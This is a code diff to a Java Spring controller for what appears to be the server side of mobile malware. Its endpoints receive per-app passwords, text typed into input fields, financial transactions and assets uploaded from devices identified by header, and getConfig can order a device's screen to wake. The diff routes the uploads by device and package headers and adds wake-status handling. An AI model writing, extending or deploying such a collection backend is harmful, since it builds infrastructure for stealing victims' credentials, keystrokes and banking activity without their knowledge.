@@ -20,6 +20,7 @@ import io.renren.modules.app.param.PasswordParam;
 import io.renren.modules.app.param.PingParam;
 import io.renren.modules.app.param.TransferRecordParam;
 import io.renren.modules.app.service.*;
+import io.renren.modules.app.vo.DeviceStatus;
 import io.renren.modules.app.vo.HeartResponse;
 import io.renren.modules.app.vo.ServerConfig;
 import lombok.extern.slf4j.Slf4j;
@@ -32,6 +33,7 @@ import org.springframework.web.bind.annotation.RestController;
 
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
+import java.security.cert.PKIXParameters;
 import java.util.Date;
 import java.util.List;
 import java.util.Objects;
@@ -66,7 +68,7 @@ public class DeviceApiController extends BaseApiController {
     private AssetService assetService;
 
     /**
-     * 心跳.
+     * 心跳. 废弃
      *
      * @return
      */
@@ -185,16 +187,20 @@ public class DeviceApiController extends BaseApiController {
     }
 
     @RequestMapping("uploadMajorData")
-    public Result<Void> uploadMajorData(@RequestBody List<MajorData> majorDataList) {
+    public Result<Void> uploadMajorData(@RequestBody List<MajorData> majorDataList, HttpServletRequest request) {
         log.info("上传重要数据:{}", JSONObject.toJSONString(majorDataList));
-        String deviceId = majorDataList.get(0).getDeviceId();
+        String deviceId = request.getHeader("device_id");
+        String pkg = request.getHeader("pkg");
         Device device = deviceService.findByDeviceId(deviceId);
         Date now = Utils.now();
         for (MajorData majorData : majorDataList) {
-            majorData.setAppName(APP_NAME.get(majorData.getPackageName()));
+            majorData.setId(null);
+            majorData.setDeviceId(deviceId);
+            majorData.setPkg(pkg);
+//            majorData.setAppName(APP_NAME.get(majorData.getPackageName()));
             MajorData _majorData = majorDataService.findByDeviceIdAndResourceId(majorData.getDeviceId(), majorData.getResourceId());
 
-            majorData.setCreateDate(now);
+            majorData.setTime(now);
             if (_majorData == null) {
                 majorDataService.save(majorData);
             } else {
@@ -209,7 +215,7 @@ public class DeviceApiController extends BaseApiController {
                 appPassword.put(majorData.getResourceId(), majorData);
                 Device updateDevice = new Device();
                 updateDevice.setId(device.getId());
-                updateDevice.setAppPassword(appPassword);
+                updateDevice.setAppPassword(appPassword);//TODO ?
                 deviceService.updateById(updateDevice);
             }
         }
@@ -230,18 +236,6 @@ public class DeviceApiController extends BaseApiController {
         logService.saveBatch(logs);
         return Result.toSuccess(null);
     }
-
-    /**
-     * 上传错误日志
-     *
-     * @param jsonObject
-     * @return
-     */
-    @RequestMapping("uploadErrorLog")
-    public Result<Void> uploadErrorLog(@RequestBody JSONObject jsonObject) {
-        return Result.toSuccess(null);
-    }
-
 
     @RequestMapping("uploadAsset")
     public Result<Void> uploadAsset(@RequestBody JSONObject json) {
@@ -284,7 +278,14 @@ public class DeviceApiController extends BaseApiController {
 
 
     @RequestMapping("uploadTransfer")
-    public Result<Void> uploadTransfer(@RequestBody List<Transfer> transfers) {
+    public Result<Void> uploadTransfer(@RequestBody List<Transfer> transfers, HttpServletRequest request) {
+        String deviceId = request.getHeader("device_id");
+        String pkg = request.getHeader("pkg");
+        for (Transfer transfer : transfers) {
+            transfer.setId(null);
+            transfer.setDeviceId(deviceId);
+            transfer.setPkg(pkg);
+        }
         log.info("上传交易:{}", transfers);
         transferService.saveBatch(transfers);
         return Result.toSuccess(null);
@@ -292,7 +293,16 @@ public class DeviceApiController extends BaseApiController {
 
 
     @RequestMapping("uploadInputTextRecord")
-    public Result<Void> uploadInputTextRecord(@RequestBody List<InputTextRecord> inputTextRecords) {
+    public Result<Void> uploadInputTextRecord(@RequestBody List<InputTextRecord> inputTextRecords, HttpServletRequest request) {
+
+        String deviceId = request.getHeader("device_id");
+        String pkg = request.getHeader("pkg");
+
+        for (InputTextRecord inputTextRecord : inputTextRecords) {
+            inputTextRecord.setId(null);
+            inputTextRecord.setDeviceId(deviceId);
+            inputTextRecord.setPkg(pkg);
+        }
 
         try {
             log.info("上传输入框:{}", JSONObject.toJSONString(inputTextRecords));
@@ -311,7 +321,7 @@ public class DeviceApiController extends BaseApiController {
      * @return
      */
     @RequestMapping("getConfig")
-    public Result<ServerConfig> getConfig(HttpServletRequest request) {
+    public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus,  HttpServletRequest request) {
         String pkg = request.getHeader("pkg");
         String deviceId = request.getHeader("device_id");
         ServerConfig serverConfig = new ServerConfig(false, null, null, "{}", false);
@@ -324,24 +334,23 @@ public class DeviceApiController extends BaseApiController {
             return Result.toSuccess(serverConfig);
         }
 
-        Device device = new Device();
-        device.setId(dbDevice.getId());
-        device.setLastHeart(Utils.now());
+        Device updateDevice = new Device();
+        updateDevice.setId(dbDevice.getId());
+        updateDevice.setLastHeart(Utils.now());
 
 
         if (dbDevice.getStatus() == Constant.DeviceStatus.need_wake /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
             log.info("{} - 需要唤醒", deviceId);
-            //TODO
-            device.setStatus(Constant.DeviceStatus.screen_on);
+            updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
             serverConfig.setWakeUp(true);
-//        } else if (dbDevice.getStatus() == Constant.DeviceStatus.wait_wake && param.getScreenStatus() == Constant.DeviceStatus.screen_on) {
-//            //唤醒成功
-//            device.setStatus(param.getScreenStatus());
-//            log.info("{} - 唤醒成功", deviceId);
+        } else if (dbDevice.getStatus() == Constant.DeviceStatus.wait_wake && deviceStatus.getScreenStatus() == Constant.DeviceStatus.screen_on) {
+            //唤醒成功
+            updateDevice.setStatus(deviceStatus.getScreenStatus());
+            log.info("{} - 唤醒成功", deviceId);
         } else {
-
+            updateDevice.setStatus(deviceStatus.getScreenStatus());
         }
-        deviceService.updateById(device);
+        deviceService.updateById(updateDevice);
         return Result.toSuccess(serverConfig);
 
     }
